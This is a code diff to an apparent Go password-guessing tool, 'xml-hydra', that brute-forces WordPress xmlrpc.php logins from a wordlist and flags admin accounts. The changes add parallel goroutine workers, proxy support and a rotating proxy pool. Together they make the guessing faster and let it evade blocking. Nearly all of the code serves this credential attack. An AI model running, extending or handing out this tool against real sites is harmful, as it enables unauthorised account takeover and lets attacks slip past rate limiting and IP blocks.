@@ -2,11 +2,13 @@ package main
 
 import (
 	"bufio"
+	"container/ring"
 	"flag"
 	"fmt"
 	"io"
 	"log"
 	"net/http"
+	"net/url"
 	"os"
 	"regexp"
 	"strings"
@@ -35,16 +37,17 @@ OPTIONS:
  -t    Target URL
  -u    Username
  -w    Wordlist for passwords
+ -g    Number of goroutines to execute at a time (Default=4)
  -h    Shows help message
 
 EXAMPLE:  xml-hydra -t https://example.com/xmlrpc.php -u username -w passwords.txt
-
 `
 
 var (
 	targetUrl string
 	username  string
 	wordlist  string
+	gnum      int
 	help      bool
 	re        = regexp.MustCompile(`(<name>isAdmin<\/name>)`)
 )
@@ -53,6 +56,7 @@ func argParse() {
 	flag.StringVar(&targetUrl, "t", "", "Target URL")
 	flag.StringVar(&username, "u", "", "Username")
 	flag.StringVar(&wordlist, "w", "", "Wordlist for passwords")
+	flag.IntVar(&gnum, "g", 4, "Number of goroutines to execute at a time (Default=4)")
 	flag.BoolVar(&help, "h", false, "Shows help message")
 
 	flag.Parse()
@@ -77,17 +81,27 @@ type Response struct {
 	Error   error
 }
 
+type CircularList struct {
+	list *ring.Ring
+}
+
 func main() {
 	argParse()
 
-	ch := make(chan Response, 10)
+	reqCh := make(chan Request)
+	resCh := make(chan Response)
 
 	passwords := ReadFileLines(wordlist)
-	CheckPasswords(targetUrl, username, passwords, ch)
+
+	go CreateRequests(targetUrl, username, passwords, reqCh)
+
+	for i := 0; i < gnum; i++ {
+		go SendRequests(reqCh, resCh)
+	}
 
 	bar := progressbar.Default(int64(len(passwords)))
 
-	for r := range ch {
+	for r := range resCh {
 		if r.Error != nil {
 			fmt.Printf("[!] Error checking (%s:%s)", r.Request.Username, r.Request.Password)
 		} else if r.Match {
@@ -98,19 +112,22 @@ func main() {
 	}
 }
 
-func CheckPasswords(url, username string, passwords []string, ch chan<- Response) {
-	go func() {
-		for i := 0; i < len(passwords); i++ {
-			r := Request{
-				URL:      url,
-				Username: username,
-				Password: passwords[i],
-				ProxyURL: "",
-			}
-			ch <- r.SendRequest()
+func CreateRequests(url, username string, passwords []string, ch chan<- Request) {
+	for _, pw := range passwords {
+		ch <- Request{
+			URL:      url,
+			Username: username,
+			Password: pw,
+			ProxyURL: "",
 		}
-		close(ch)
-	}()
+	}
+	close(ch)
+}
+
+func SendRequests(in <-chan Request, out chan<- Response) {
+	for r := range in {
+		out <- r.Send()
+	}
 }
 
 func (r *Request) Body() io.Reader {
@@ -125,9 +142,20 @@ func (r *Request) Body() io.Reader {
 	</methodCall>`, r.Username, r.Password))
 }
 
-func (r *Request) SendRequest() Response {
+func (r *Request) Send() Response {
 	req, _ := http.NewRequest("POST", r.URL, r.Body())
-	client := http.Client{}
+	var client http.Client
+
+	if r.ProxyURL != "" {
+		proxyURL, err := url.Parse(r.ProxyURL)
+		if err != nil {
+			log.Printf("[!] Failed to parse proxy %s", r.ProxyURL)
+		}
+		transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+		client = http.Client{Transport: transport}
+	} else {
+		client = http.Client{}
+	}
 
 	res, err := client.Do(req)
 
@@ -150,6 +178,23 @@ func (r *Request) SendRequest() Response {
 		Match:   re.Match(body),
 		Request: *r,
 	}
+}
+
+func NewProxyPool(items []string) *CircularList {
+	cl := &CircularList{
+		list: ring.New(len(items)),
+	}
+	for i := 0; i < cl.list.Len(); i++ {
+		cl.list.Value = items[i]
+		cl.list = cl.list.Next()
+	}
+	return cl
+}
+
+func (cl *CircularList) GetItem() interface{} {
+	val := cl.list.Value
+	cl.list = cl.list.Next()
+	return val
 }
 
 func ReadFileLines(filePath string) []string {
